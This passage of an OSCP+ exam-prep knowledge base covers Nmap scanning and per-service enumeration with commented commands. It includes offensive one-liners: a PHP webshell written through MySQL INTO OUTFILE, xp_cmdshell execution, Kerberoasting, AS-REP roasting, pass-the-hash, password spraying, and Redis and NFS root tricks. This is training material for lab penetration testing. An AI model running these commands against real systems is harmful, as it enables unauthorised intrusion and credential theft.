17. Stuck 30 min on standalone #2. What exactly do you do? *(invoke `[STUCK-PROTOCOL]`: re-enum all ports/web, list untried surfaces, switch to another target, return fresh.)*

---

# PART 35 — [NAVIGATION-SIM] Using this KB with Ctrl+F

Each: **FINDING → search tag → technique → command → interpret → next.**

1. **Unknown web server:** `Ctrl+F [WEB-QUICK]` → fingerprint+content map → `whatweb`/feroxbuster → note CMS/version/params → `[SQLI]`/`[WEB-LFI]`/searchsploit.
2. **Low-priv Linux shell:** `[LINUX-PRIVESC-QUICK]` → `sudo -l`/SUID/linpeas → interpret hits vs false positives → `[GTFOBINS-WORKFLOW]`.
3. **Low-priv Windows shell:** `[WINDOWS-PRIVESC-QUICK]` → `whoami /priv`+winpeas → SeImpersonate? service? → `[WINDOWS-TOKENS]`/`[WINDOWS-SERVICES]`.
4. **SMB server:** `[SMB-QUICK]` → anon/shares/users → `nxc`/`smbclient`/`enum4linux-ng` → creds/files → `[FOUND-SMB]`.
5. **Domain user:** `[AD-QUICK]` → BloodHound+roast+spray → `[AD-KERBEROAST]`/`[AD-ASREP]`/`[AD-ACL]` → `[AD-ATTACK-PATH]`.
6. **SQL injection:** `[SQLI-DECISION-TREE]` → identify DB → union/blind → `[SQLI-MYSQL]` etc → creds/file/RCE.
7. **LFI:** `[WEB-LFI]` → confirm `/etc/passwd` → wrappers/log-poison → RCE → `[SHELL-QUICK]`.
8. **Credentials:** `[FOUND-CREDS]` → spray everywhere → `[CREDENTIALS-QUICK]`.
9. **BloodHound edge:** `[AD-BLOODHOUND]` → identify edge type → `[AD-ACL]` abuse recipe.
10. **Pivot host:** `[PIVOT-QUICK]` → Ligolo/Chisel → proxychains scan → enumerate new subnet.

---

# [CURRENT-OFFSEC-RULES-SUMMARY]  (verify on the live exam guide before your exam)
- 23h45m hands-on + 24h reporting. 100 pts, **70 to pass**. No bonus points.
- 40-pt AD set (3 chained hosts, effectively all-or-nothing) + 3×20-pt standalones (10 local + 10 proof).
- **Metasploit/Meterpreter: one target only; not for pivoting.** Manual everything else.
- Restricted/forbidden: automated exploitation frameworks, one-click AD auto-pwn tools, automated vuln scanners as primary exploitation, AI that solves the box, spoofing/DoS. **Check the current guide — rules change.**
- Proof = flag contents + `whoami`/`id` + `ip a`/`ipconfig` in one screenshot, plus flag entered in the panel. Report required, reproducible, on time.
- OSCP+ expires in 3 years (renewable); underlying OSCP is lifetime.

---
*End Volume 0. Continue: Volume 1 (Enumeration & Nmap).*


# OSCP+ KNOWLEDGE BASE — VOLUME 1
## FINDING OPEN DOORS: SCANNING (NMAP) + ENUMERATING EVERY SERVICE

> **New here? Read this box first — it unlocks every command in this volume.**
>
> **Placeholders you must replace.** Commands use short stand-ins so you can copy them fast. Before anything works you must set the target IP once, and mentally swap the rest:
> ```bash
> export IP=10.10.10.5        # ← run this ONCE per box; now every "$IP" below becomes your target
> mkdir -p scans              # ← make a folder to save scan output into (commands write here)
> ```
> - `$IP` = the target machine's IP address (you just set it above).
> - `$U` = a **username** you found. `$P` = a **password** you found. Type the real value in place of them.
> - `<something>` = "put your own value here" (e.g. `<domain>` = the target's domain name like `corp.local`).
> - `scans/all-tcp.txt` = just a filename to save results into, so you don't lose them.
>
> **The tags.** Each section has a `[TAG]` in square brackets (like `[ENUM-SMB]`). Tags are **bookmarks**: when a line says *"→ `[WEB-QUICK]`"* it means *"go read that section next"* — press **Ctrl+F**, type the tag, jump there. Difficulty labels:
> - `[MUST-MEMORIZE]` = learn it by heart, you'll type it on every box.
> - `[MUST-RECOGNIZE]` = you don't need it memorized, but know what it does when you see it.
> - `[LOOK-UP]` = niche; fine to look up during the exam, don't cram it.
>
> **The golden habit:** *enumerate everything before attacking anything.* Most beginners fail by rushing the first open port. Scan all ports, then look at **every** service, then pick the easiest way in.

---

# [NMAP] SCANNING — finding which doors are open

**What is Nmap?** A port scanner. A "port" is a numbered door on a computer (0–65535); a program listening behind a door is a "service" (web server, file share, database…). Nmap knocks on the doors and tells you which are **open** and what's behind them. This is always your **first step** on a new target.

## [NMAP-QUICK]  the three scans you'll run on every box  (one screen)
```bash
# 1) Fast: knock on ALL 65535 doors, just tell me which are OPEN   [MUST-MEMORIZE]
nmap -p- --min-rate 2000 -Pn -oN scans/all-tcp.txt $IP
#    -p-           = scan every port (not just the common 1000)
#    --min-rate 2000 = go fast (send ≥2000 packets/sec); lower to 1000 if results look flaky
#    -Pn           = "assume host is up, skip the ping" (many boxes block ping and look 'down')
#    -oN file      = save a readable copy to that file (ALWAYS save — you'll re-read it)

# 2) Deep: for the ports found open, get the software + version + run default checks   [MUST-MEMORIZE]
nmap -p22,80,445 -sCV -Pn -oN scans/services.txt $IP
#    -p22,80,445   = only the ports step 1 found open (replace with your real list)
#    -sC           = run Nmap's "default scripts" (safe probes that reveal extra info)
#    -sV           = detect the exact service + version (e.g. "Apache 2.4.49") → search it for exploits
#    (-sCV is just -sC and -sV together)

# 3) UDP: a few services only answer on UDP (different protocol) — scan the top ones   [MUST-RECOGNIZE]
nmap -sU --top-ports 100 --min-rate 1000 -Pn -oN scans/udp.txt $IP
#    -sU           = scan UDP instead of TCP
#    --top-ports 100 = only the 100 most common UDP ports (full UDP is painfully slow)
```
**Read the results like this:**
- Step 1 tells you *which* doors are open. Note every number.
- Step 2 tells you *what program + version* is behind each door → that version is what you search for known exploits.
- Step 3 catches UDP-only services (SNMP on 161, DNS on 53, TFTP on 69) that TCP scans miss.

## [NMAP-TCP]  the standard two-step, explained  [PRACTICAL]
**Why two steps?** Scanning all 65535 ports *with* version detection is very slow. So: **step 1** finds open ports fast (no version detection); **step 2** does the slow version/script work **only** on the handful that were open. Never run `-sCV -p-` together — you'll wait forever.

**The flags that matter (and what each is for):**
- `-p-` → scan all 65535 ports. Without it, Nmap only checks the common 1000 and **misses services on weird high ports** (a very common way beginners miss the way in).
- `--min-rate 2000` → speed. If a box is fragile and results change between runs, drop to `--min-rate 1000`.
- `-Pn` → skip the "is it alive?" ping. Windows and firewalled boxes often block ping and would otherwise be wrongly reported as "down". **Always use `-Pn`.**
- `-sC` (default scripts), `-sV` (versions) → the info that tells you *how* to attack.
- `-oN scans/file.txt` (readable) or `-oA scans/name` (saves 3 formats at once) → **always save output.** You will re-read scans constantly.
- `-T4` → a coarser speed dial; `--min-rate` is the finer control. Either is fine.

**One-command version (fine for a single box, just slower):**
```bash
nmap -p- -sCV -Pn --min-rate 1500 -oA scans/full $IP    # all ports + versions in one go
```
**Faster port discovery (optional tool):** `rustscan -a $IP -- -sCV -oN scans/services.txt` — rustscan finds open ports very fast, then hands them to Nmap. `[LOOK-UP]`

## [NMAP-UDP]  [PRACTICAL]
UDP scanning is slow and unreliable (UDP services often don't reply, so Nmap has to guess). **Scan the top 100–200 UDP ports, never all of them.**
```bash
nmap -sU --top-ports 200 --min-rate 1000 -Pn $IP
```
- `open|filtered` = "no reply, can't tell" — normal for UDP. For a promising one, probe it directly with its own tool.
- **High-value UDP ports to care about:** 161 (SNMP — often leaks creds!), 53 (DNS), 69 (TFTP), 123 (NTP), 500 (IKE/VPN), 137 (NetBIOS).

## [NMAP-SERVICE-ENUM] / [NMAP-SCRIPTS]  running targeted checks  [PRACTICAL]
Nmap ships with hundreds of small scripts (the "NSE"). You can aim specific ones at a service:
```bash
nmap --script "safe or default" -p<ports> $IP          # run all the safe/standard checks
# service-specific bundles:
nmap --script "smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode" -p445 $IP   # SMB
nmap --script "http-enum,http-title,http-headers,http-methods" -p80 $IP                        # web
nmap --script "ftp-anon,ftp-syst" -p21 $IP                                                     # FTP
nmap --script vuln -p<ports> $IP     # broad "any known vulns?" — NOISY, gives false alarms [LOOK-UP]
```
- Treat `--script vuln` as a **lead generator, not proof** — it flags maybes; you still verify by hand.
- Find a script: `ls /usr/share/nmap/scripts | grep <service>`. Read what it does: `nmap --script-help <name>`.

## [NMAP-TROUBLESHOOTING]  when a scan misbehaves
| What you see | Why | What to do |
|---|---|---|
| Every port says "filtered" | A firewall is dropping your probes, or ping is blocked | Add `-Pn`; lower `--min-rate`; try `-sT` (full-connect scan), especially through a proxy |
| Host reported "down" but the website loads | Ping (ICMP) is blocked | Always use `-Pn` |
| Version looks wrong / "unsure" | The service hides its banner | Probe by hand (`nc`, `curl`, the service's own client); add `--version-intensity 9` |
| Scan is crawling | UDP, or too-high rate on a lossy link | UDP: top-ports only. TCP: `--min-rate 1000` |
| Fails through proxychains | SOCKS proxies can't carry raw SYN/UDP packets | Use `-sT -Pn` (TCP connect) only; no UDP over a proxy |
| Different results each run | Rate too high, packets getting dropped | Lower `--min-rate`, run again |
| Box is clearly up but almost everything is "filtered" | possible **port knocking** (a service opens only after you connect to a secret sequence of ports first) | look for the knock sequence in a config/README/comment you looted; then `for p in 7000 8000 9000; do nmap -Pn -p $p $IP; done` and re-scan — the hidden port opens |

**Time-wasters to avoid (rabbit holes):** believing `--script vuln` without checking; obsessing over a single "filtered" port; running full UDP `-p-`; fussing over exact OS-detection guesses.

---

# ENUMERATING EACH SERVICE — what to do behind every open door

> For each service: **what it is** (plain English) → **commands** (every line commented) → **what to check, what can go wrong, and where it leads.** Jump straight to the port you found open using the decision table at the bottom (`[ENUM-DECISION]`).

## [PORT-PLAYBOOK]  the ports to recognise on sight + your FIRST move
When nmap comes back, don't panic at the list — recognise each port and reach for its first move. **Attack priority: web (80/443) → SMB (445) → AD (88/389) → databases → the rest.**

| Port(s) | Protocol / service | What it is (plain English) | Your FIRST move | Jump |
|---|---|---|---|---|
| 21 | FTP | file transfer, often **anonymous** | try `anonymous`/any-pass; download everything; can you upload? | `[ENUM-FTP]` |
| 22 | SSH | remote login shell | note the version; only useful with a **found** password/key (don't brute) | `[ENUM-SSH]` |
| 23 | Telnet | ancient cleartext login | grab banner; try creds you have | `[ENUM-UNUSUAL-PORTS]` |
| 25/465/587 | SMTP | mail | enumerate **usernames** (`VRFY`, `RCPT`) → feed AD attacks | `[ENUM-SMTP]` |
| 53 | DNS | name lookups | attempt a **zone transfer**; on AD it reveals DCs | `[ENUM-DNS]` |
| 80/443/8080/8000 | HTTP(S) | ⭐ a **website** — #1 foothold | enumerate FULLY: `whatweb`, dir-brute, **version→exploit** | `[WEB-QUICK]` |
| 88 | Kerberos | AD authentication | 🚨 **it's a DOMAIN CONTROLLER** — switch to AD mode | `[ENUM-KERBEROS]` / `[AD-QUICK]` |
| 110/143 | POP3/IMAP | mailboxes | test found creds; read mail for secrets | `[ENUM-UNUSUAL-PORTS]` |
| 111 | RPCbind | Unix RPC → points to NFS | `showmount -e` to find NFS exports | `[ENUM-NFS]` |
| 135 | MSRPC | Windows RPC | `rpcclient -U '' -N` null session → users | `[ENUM-RPC]` |
| 139/445 | SMB | ⭐ Windows file sharing | `nxc smb`; try **null session** shares/users | `[ENUM-SMB]` |
| 161 (UDP) | SNMP | device monitoring | `snmpwalk -c public` → **creds in process args** (easy win) | `[ENUM-SNMP]` |
| 389/636/3268 | LDAP | the AD directory | anonymous bind dump; passwords hide in `description` | `[ENUM-LDAP]` |
| 623 (UDP) | IPMI | server management | dump the **pre-auth hash** → crack it | `[ENUM-IPMI]` |
| 1433 | MSSQL | MS SQL Server database | creds → `xp_cmdshell` **RCE** | `[ENUM-MSSQL]` |
| 1521 | Oracle | Oracle database | SID-guess → default creds (`scott/tiger`) → RCE | `[ENUM-ORACLE]` |
| 2049 | NFS | Unix file shares | mount it; **`no_root_squash`** → root | `[ENUM-NFS]` |
| 3306 | MySQL | database | try `root`/blank; `FILE` priv → read/write files | `[ENUM-MYSQL]` |
| 3389 | RDP | remote desktop (GUI) | test creds → `xfreerdp` login | `[ENUM-RDP]` |
| 5432 | PostgreSQL | database | try `postgres`/blank; `COPY ... PROGRAM` → RCE | `[ENUM-POSTGRES]` |
| 5900 | VNC | remote desktop | auth-bypass / crack the VNC password / connect | `[ENUM-VNC]` |
| 5985/5986 | WinRM | remote PowerShell | `nxc winrm` creds → `evil-winrm` **shell** | `[ENUM-WINRM]` |
| 6379 | Redis | in-memory DB, **often no auth** | connect; write a webshell / SSH key | `[ENUM-REDIS]` |
| 27017 | MongoDB | NoSQL DB, often no auth | dump collections → creds/tokens | `[ENUM-MONGODB]` |
| 2375/2376 | Docker API | container engine | unauth API → **host root** | `[ENUM-DOCKER]` |

**The instant "tells" — train these gut reactions:**
- **Port 88 open → it's a Domain Controller → go AD** (BloodHound, roasting, spraying).
- **445 with `signing:False` → NTLM relay is possible** (lab only; poisoning is banned on the exam).
- **Anonymous FTP / null SMB / world-readable NFS → free files — loot them first.**
- **A database port (1433/3306/5432) + a credential → usually the fastest RCE.**
- **A version number on ANY service → `searchsploit` / CVE it immediately** (`[EXPLOIT-RESEARCH]`).
- **161 SNMP → `snmpwalk` is a low-effort credential jackpot** (passwords in process arguments).
- **Lots of high ports 49152+ on Windows → normal RPC plumbing, ignore them.**

**Golden habit:** the open ports are a **menu, not a checklist in order** — enumerate them all, then attack the *easiest* win first (web, SMB, or a known-version exploit).

## [ENUM-FTP]  Port 21 — FTP (file transfer)
**What it is:** an old way to upload/download files. It's a goldmine when it allows **anonymous** login (username `anonymous`, any password) — you might read config files, backups, or even the website's files. If FTP shares the same folder as the web server, you can sometimes **upload a "webshell"** (a small script that lets you run commands via the browser).
```bash
nmap -p21 -sCV --script ftp-anon $IP          # check the version + whether anonymous login is allowed
ftp $IP                                        # log in interactively — try user: anonymous, password: (just press Enter)
wget -r ftp://anonymous:anonymous@$IP/         # download EVERYTHING on the server, recursively, to your machine
curl ftp://$IP/ --user anonymous:anonymous     # just list the files without logging in interactively
hydra -l $U -P rockyou.txt ftp://$IP           # guess a password — ONLY if you have a real reason [LOOK-UP]
```
**What to check / do:**
- Got in anonymously? **List and download everything.** Try `put testfile` — can you upload? If yes *and* it's the web root → drop a webshell.
- Loot you want: config files, backups, `.txt` files with passwords, source code. **Any password you find, try it on every other service** (people reuse passwords — this is "credential spraying/reuse").
- Downloading a binary and it's corrupt? Type `binary` in the ftp prompt before `get`.

**Known weak spots:** vsftpd 2.3.4 (has a joke backdoor — opens a root shell on port 6200) · ProFTPD 1.3.5 (`mod_copy` lets you copy files → write a webshell) · anonymous **write** access.
**Where it leads:** a webshell, credentials, or source code → see `[FOUND-CREDS]` (Volume 6) and `[WEB-UPLOAD]` (Volume 2).

## [ENUM-SSH]  Port 22 — SSH (remote login shell)
**Big idea:** SSH is almost never the way *in* — it's the **reward**. You rarely break SSH directly; instead you find a password or a private key *somewhere else* (a file, a share, a database) and then log in with it. Don't waste time attacking SSH head-on.
```bash
nmap -p22 -sCV $IP                         # read the version banner (hints at the OS/distro)
ssh $U@$IP                                 # log in with a username + a password you found
chmod 600 id_rsa ; ssh -i id_rsa $U@$IP    # log in with a private KEY file (chmod 600 first, or SSH refuses it)
ssh2john id_rsa > h ; john --wordlist=rockyou.txt h   # key wants a passphrase? crack it (see Volume 3)
hydra -l $U -P rockyou.txt ssh://$IP       # password-guess as a LAST resort — slow and noisy, needs a known user
```
- A **private key** (often a file named `id_rsa`) is like a password-less door key. If you find one, `chmod 600` it (SSH rejects keys that others could read) then log in with `-i`.
- Read `~/.ssh/authorized_keys` and `known_hosts` on any box you get onto — they leak **other usernames and other target machines**.

**Troubleshoot:**
- `Permission denied (publickey)` → wrong key, or wrong username.
- `no matching key exchange/cipher` (very old server) → `ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa $U@$IP`

**Where it leads:** a foothold (your first shell) → `[LINUX-PRIVESC-QUICK]` · tunneling through it → `[PIVOT-SSH]`.

## [ENUM-SMTP]  Ports 25/465/587 — Mail (SMTP)
**What it is:** the mail-sending service. For OSCP its main use is **finding valid usernames** — you ask the mail server "does user X exist?" and it tells you. Those usernames feed Active Directory attacks later.
```bash
nmap -p25 -sCV --script "smtp-commands,smtp-enum-users" $IP   # server capabilities + user-guessing
smtp-user-enum -M RCPT -U users.txt -t $IP    # check a list of names against the server [LOOK-UP]
nc $IP 25                                      # talk to it by hand: type  VRFY root  or  RCPT TO:<user>
```
**What to check:** the banner may leak the mail software and an internal hostname. Valid users → feed them into AD spraying/roasting (`[AD-QUICK]`).

## [ENUM-DNS]  Port 53 — DNS (name lookups)  → also `[TECH-DNS]`
**What it is:** the phone book that turns names (`server.corp.local`) into IPs. The jackpot here is a **zone transfer** — if misconfigured, the server hands you a full list of every internal hostname at once. On Active Directory, DNS also reveals the Domain Controllers.
```bash
dig axfr @$IP <domain>                     # ZONE TRANSFER — dumps ALL records at once (the big win)
dig any @$IP <domain>                       # ask for any records it'll share
dig -x $IP @$IP                             # reverse lookup (IP → name)
dnsrecon -d internal.lan -a -n $IP          # automated enumeration (includes the zone-transfer attempt)
dnsrecon -d <domain> -D wordlist.txt -t brute   # guess subdomain names from a wordlist
nslookup -type=SRV _ldap._tcp.<domain> $IP  # AD trick: locate Domain Controllers via SRV records
```
**What to check / do:** **every hostname you discover, add it to your `/etc/hosts`** file (`sudo nano /etc/hosts`, add a line `<IP>  server.corp.local`) so your tools can reach it by name.
**Where it leads:** new website names to fuzz (`[WEB-CONTENT]`) · identifying the DC (`[AD-ENUM]`).

## [ENUM-HTTP] / HTTPS  Ports 80/443/8080/8000/8443/… — Web
**What it is:** a website. This is the **#1 way into most boxes.** Enumerate **every** HTTP port thoroughly — the full method is Volume 2 (`[WEB-*]`). Quick first look:
```bash
whatweb http://$IP        # identify the tech stack (server, CMS, frameworks)
curl -sI http://$IP       # show just the response headers (server type, redirects, cookies)
# then: view page source · read /robots.txt · brute-force hidden directories · brute-force vhosts
```
**Look for:** the CMS and its version (→ search for exploits), any redirect to a hostname (add it to `/etc/hosts`, then fuzz it as a "vhost"), login pages, file-upload pages, and URL parameters (`?id=1`) to test for injection.
**Where it leads:** SQL injection / file inclusion / file upload / command injection / a known-version exploit → your first shell. **Start at `[WEB-QUICK]` in Volume 2.**

## [ENUM-SMB]  Ports 139/445 — SMB (Windows file sharing)  → also `[TECH-SMB]`
**What it is:** Windows file-and-printer sharing. On a Windows/AD network it's the workhorse: you can sometimes list shared folders and usernames **without any password** ("null session"), test whether creds work, move between machines, and loot files left in shares.

### [SMB-QUICK]  first look  (one screen)
```bash
nxc smb $IP                              # basic info: OS, hostname, domain, signing   [MUST-MEMORIZE]
nxc smb $IP -u '' -p '' --shares         # try to list shared folders with NO credentials (null session)
nxc smb $IP -u 'guest' -p '' --shares    # fallback: try the "guest" account
enum4linux-ng -A $IP                     # throw everything at it automatically (users, shares, policy)
smbclient -N -L //$IP/                   # another way to list shares with no creds (-N = no password)
smbclient -N //$IP/<share>               # connect INTO a share; then use: ls, get <file>, recurse ON
```
> **What is `nxc`?** `nxc` (NetExec, formerly CrackMapExec/`cme`) is a Swiss-army knife for Windows protocols (SMB, WinRM, LDAP, MSSQL…). You'll use it constantly. `smbclient` is a simpler one-share file browser.

**Look for:** `signing:False` (means NTLM-relay attacks are possible), folders you can **read** or **write**, usernames, and the domain name. **Next:** read every readable share; try any found password on other accounts.

### [SMB-ENUM]  deeper enumeration
```bash
nxc smb $IP -u '' -p '' --shares --users     # null session: list shares AND users
nxc smb $IP -u guest -p '' --shares          # guest fallback
nxc smb $IP -u '' -p '' --rid-brute          # pull usernames by cycling ID numbers (works with no creds)
smbclient -N //$IP/Share                      # browse a share; inside: 'recurse ON', 'prompt OFF', then 'mget *'
mount -t cifs //$IP/Share /mnt/s -o username=$U,password=$P   # mount a share locally so you can grep it [LOOK-UP]
nxc smb $IP -u $U -p $P --shares --users --pass-pol --groups  # with creds: full enumeration
nxc smb <hosts.txt> -u users.txt -p 'Password1' --continue-on-success   # spray ONE password at many users/hosts
nxc smb $IP -u $U -H <ntlmhash>              # log in with a HASH instead of a password ("pass-the-hash")
nmap --script smb-vuln-ms17-010 -p445 $IP   # check for EternalBlue (old, unpatched Windows)
```
> **"Spraying"** = trying one likely password against many usernames (safer than hammering one user, which can lock the account). **"Pass-the-hash"** = Windows lets you authenticate with the password's *hash* (a scrambled fingerprint) even if you never cracked the actual password.

**Files worth grabbing from shares:** `Groups.xml` / GPP files (contain an encrypted-but-crackable `cpassword`), login scripts, `web.config`, `unattend.xml`, backups, `.kdbx` (KeePass), `.ps1` scripts, sticky-notes.
**Common misconfigs:** null/guest read access · a **writable** share (drop a `.scf`/`.lnk` file to steal a hash) · SMB signing off (relay attacks).
**Known vulns:** MS17-010 "EternalBlue" (old boxes) · GPP `cpassword`.

### [SMB-ATTACK]  turning SMB access into a shell
```bash
impacket-psexec $U:$P@$IP        # get a SYSTEM shell using ADMIN creds — reliable but "loud"
impacket-wmiexec $U:$P@$IP       # run commands more quietly (no service created)
nxc smb $IP -u $U -p $P -x whoami   # run a single command and see the output
# writable share → drop a malicious .scf/.url/.lnk, run Responder/ntlmrelayx to catch the hash [LOOK-UP]
```
See `[AD-LATERAL]` (Volume 5) for the full "move to another machine" menu.

### [SMB-TROUBLESHOOTING]
| What you see | Meaning / fix |
|---|---|
| `NT_STATUS_ACCESS_DENIED` when listing | null session is disabled → you need real creds |
| `STATUS_LOGON_FAILURE` | wrong creds — check the domain: add `-d DOMAIN` or use `-u DOMAIN/user` |
| `STATUS_ACCOUNT_RESTRICTION` | that account isn't allowed to use SMB / only on certain hosts |
| smbclient: "protocol negotiation failed" | ancient SMBv1 → `smbclient --option='client min protocol=NT1'` |
| `STATUS_NOT_SUPPORTED` | SMBv1 disabled (fine) → use nxc / SMB2 |
| Kerberos "clock skew" errors | your clock differs from the DC → `sudo ntpdate $IP` |

**Where it leads:** creds, loot, moving laterally, and full AD enumeration → `[FOUND-SMB]`, spray creds, `[AD-ENUM]`.

## [ENUM-RPC]  Port 135 (Windows RPC) / Port 111 (Unix RPC)
**What it is:** 135 is a Windows service that can leak **users and domain info** (sometimes when SMB won't). 111 is the Unix "portmapper" that points you to **NFS** file shares.
```bash
rpcclient -U '' -N $IP     # connect with no creds; then type: enumdomusers / enumdomgroups / queryuser 0x<rid> / srvinfo
impacket-rpcdump $IP       # list the available RPC services
rpcinfo -p $IP             # Unix side (111): what RPC services exist
showmount -e $IP           # Unix side: list NFS exports (shared folders)
```
**Where it leads:** usernames (→ spray/roast), NFS shares to mount.

## [ENUM-LDAP]  Ports 389/636/3268/3269 — LDAP (the AD directory)  → `[AD-ENUM]`, `[TECH-LDAP]`
**What it is:** the Active Directory database, queried over the network. An "anonymous bind" (no login) can sometimes dump all users, computers, and their **descriptions** — and admins sometimes stash **passwords in the description field**.
```bash
ldapsearch -x -H ldap://$IP -s base namingcontexts     # find the "base DN" (e.g. dc=corp,dc=local) — you need this
ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local"      # anonymous dump: users, descriptions (creds!), computers
ldapsearch -x -H ldap://$IP -D '$U@corp.local' -w '$P' -b "dc=corp,dc=local" "(objectClass=user)" sAMAccountName description   # with creds
nxc ldap $IP -u $U -p $P --users --groups --asreproast asrep.txt --kerberoasting kerb.txt   # users + build roast target lists
ldapdomaindump -u 'corp.local\$U' -p $P $IP            # dump everything to browsable HTML/JSON
```
> `-x` = simple auth, `-H` = the server URL, `-b` = the "base DN" (where in the tree to start — get it from the first command). The **base DN** is just the directory's root path, written like `dc=corp,dc=local` for the domain `corp.local`.

**Where it leads:** full AD enumeration, passwords in descriptions, Kerberoast/AS-REP target lists, and data to feed BloodHound (`[AD-BLOODHOUND]`).

## [ENUM-KERBEROS]  Port 88 — Kerberos (AD login system)  → `[AD-KERBEROAST]`, `[AD-ASREP]`
**What it is:** the authentication system Active Directory uses. **The moment you see port 88 open, this machine is a Domain Controller — switch your whole mindset to "this is AD."**
```bash
sudo ntpdate $IP     # FIRST fix the clock (Kerberos fails if your clock differs from the DC's)
impacket-GetNPUsers <domain>/ -no-pass -usersfile users.txt -dc-ip $IP   # AS-REP roast: grab crackable hashes with NO creds
impacket-GetUserSPNs -request <domain>/$U:$P -dc-ip $IP                   # Kerberoast: grab crackable hashes with ANY one cred
```
> **AS-REP roasting** = some accounts are misconfigured so anyone can request a chunk of crackable data (a "hash") for them, no login needed. **Kerberoasting** = with *any* valid account you can request crackable hashes for service accounts. Both hashes get cracked offline in Volume 3.

**Where it leads:** crackable hashes → passwords, and confirmed usernames → `[AD-QUICK]`.

## [ENUM-WINRM]  Ports 5985/5986 — WinRM (remote PowerShell)  → `[TECH-WINRM]`
**What it is:** remote PowerShell access — **if** your account is in the "Remote Management Users" or Administrators group. Once you have working creds, this is a prime way to get an interactive Windows shell.
```bash
nxc winrm $IP -u $U -p $P     # test the creds — if it prints "(Pwn3d!)" you CAN get a shell
evil-winrm -i $IP -u $U -p $P # get the interactive shell (has built-in 'upload' and 'download' commands)
evil-winrm -i $IP -u $U -H <ntlmhash>   # log in with a hash instead of a password
```
> `(Pwn3d!)` in nxc output = "these creds are strong enough to execute here" — a green light.
**Troubleshoot:** nxc validates but evil-winrm fails → the user isn't allowed WinRM. TLS on port 5986 → add `-S`. Kerberos time errors → `ntpdate`.
**Where it leads:** an interactive Windows foothold → `[WINDOWS-PRIVESC-QUICK]`.

## [ENUM-RDP]  Port 3389 — RDP (Remote Desktop, the GUI)  → `[TECH-RDP]`
**What it is:** full graphical remote desktop. With valid creds you get a Windows desktop; very old versions have the risky "BlueKeep" exploit (rarely needed).
```bash
nxc rdp $IP -u $U -p $P                                       # test whether the creds work for RDP
xfreerdp /v:$IP /u:$U /p:$P +clipboard /dynamic-resolution    # connect to the desktop   [MUST-RECOGNIZE]
xfreerdp /v:$IP /u:$U /pth:<ntlmhash>                         # pass-the-hash (needs "Restricted Admin" mode)
xfreerdp /v:$IP /u:$U /p:$P /drive:share,/tmp                 # share your /tmp into the session to move files
```
**Where it leads:** a graphical foothold — handy for running winPEAS visually or moving files via clipboard/mapped drive.

## [ENUM-SNMP]  Port 161/UDP — SNMP (device monitoring)  → `[TECH-SNMP]`
**What it is:** a monitoring protocol. If the "community string" (a shared password) is the default `public`, it happily dumps **running process command-lines (which often contain passwords!), user lists, installed software, and open ports.** High reward, low effort — don't skip it.
```bash
snmpwalk -v2c -c public $IP     # dump everything the device will share
snmp-check $IP -c public        # same data, formatted more nicely
onesixtyone -c common.txt $IP   # guess the community string if 'public' doesn't work
# useful OIDs (an OID is an "address" for a specific piece of data) [LOOK-UP]:
#   processes:      1.3.6.1.2.1.25.4.2.1.2
#   process args:   1.3.6.1.2.1.25.4.2.1.5   ← passwords often hide here
#   installed sw:   1.3.6.1.2.1.25.6.3.1.2
#   user accounts:  1.3.6.1.4.1.77.1.2.25
```
**Where it leads:** passwords in process arguments, usernames, internal software/ports.

## [ENUM-NFS]  Port 2049 (+111) — NFS (Unix file sharing)  → `[TECH-NFS]`
**What it is:** the Unix version of SMB. Shared folders ("exports") may be world-readable/writable, and a setting called **`no_root_squash`** can hand you root.
```bash
showmount -e $IP                              # list the shared folders (exports)
mount -t nfs $IP:/export /mnt/nfs -o nolock   # mount one locally so you can read it (creds, keys, source)
```
**What to check / do:**
- Is `no_root_squash` set? Then on **your** machine (as root) drop a special "SUID root" program into the mounted folder; running it on the target as a low-priv user gives you **root** (full steps in `[LINUX-PRIVESC]`, NFS section).
- Files show wrong owner / you can't read them? Create a local user with the **same UID number** as the file's owner.
**Where it leads:** creds/keys, or root via the SUID trick.

## [ENUM-MSSQL]  Port 1433 — Microsoft SQL Server  → `[SQLI-MSSQL]`, `[TECH-SQL]`
**What it is:** Microsoft's database. With creds you can often run OS commands (`xp_cmdshell`), steal/relay Windows hashes, or impersonate the `sa` (admin) account.
```bash
nxc mssql $IP -u $U -p $P                        # test the creds
impacket-mssqlclient $U:$P@$IP -windows-auth     # connect; then, INSIDE the client prompt:
#   enable_xp_cmdshell                            #   turn on command execution
#   xp_cmdshell 'whoami'                          #   run an OS command (needs sysadmin/impersonation)
#   EXEC xp_dirtree '\\<yourKaliIP>\x'            #   force it to auth to YOU → catch the hash on Responder
#   EXEC AS LOGIN='sa'                            #   become 'sa' if impersonation is allowed
#   SELECT * FROM master..sysservers              #   list "linked servers" → hop to another DB/host
```
**Where it leads:** command execution as the SQL service account (often has SeImpersonate → SYSTEM), hash capture, or lateral movement via linked servers.

## [ENUM-MYSQL]  Port 3306 — MySQL  → `[SQLI-MYSQL]`
```bash
mysql -h $IP -u root -p                # try passwords: blank, 'root', 'toor'
nmap -p3306 --script mysql-empty-password,mysql-info $IP   # check for a blank root password
#   once inside:  show databases;  use <db>;  show tables;  select * from users;   → app creds/hashes
#   if the account has FILE privilege:
#     SELECT LOAD_FILE('/etc/passwd');                              # read a file off the server
#     SELECT '<?php system($_GET[c]); ?>' INTO OUTFILE '/var/www/html/sh.php';   # write a webshell
```
**Where it leads:** application creds/hashes (→ spray) and file read/write (→ webshell). UDF RCE if the plugin dir is writable `[LOOK-UP]`.

## [ENUM-POSTGRES]  Port 5432 — PostgreSQL  → `[SQLI-POSTGRES]`
```bash
psql -h $IP -U postgres      # try password: 'postgres' or blank
nxc postgres $IP -u $U -p $P # test creds
#   command execution (superuser, v9.3+):  COPY t FROM PROGRAM 'id';
#   read a file:                           COPY t FROM '/etc/passwd';    [LOOK-UP]
```
**Where it leads:** command execution as the postgres user, file read.

## [ENUM-REDIS]  Port 6379 — Redis (in-memory database)
**What it is:** a fast key-value store that is **frequently left with no password.** If so, you can often write files to disk → drop a webshell, an SSH key, or a cron job.
```bash
redis-cli -h $IP        # connect; then type: info ; config get dir ; keys *
#   no-auth file write trick: set 'dir' + 'dbfilename' to the web root or ~/.ssh, then save
#     → writes a webshell or an authorized_keys file
#   MODULE LOAD → full command execution on some versions [LOOK-UP]
```
**Where it leads:** file write → foothold; stored data (session tokens, creds).

## [ENUM-MONGODB]  Port 27017 — MongoDB
```bash
mongosh --host $IP        # or the older:  mongo $IP
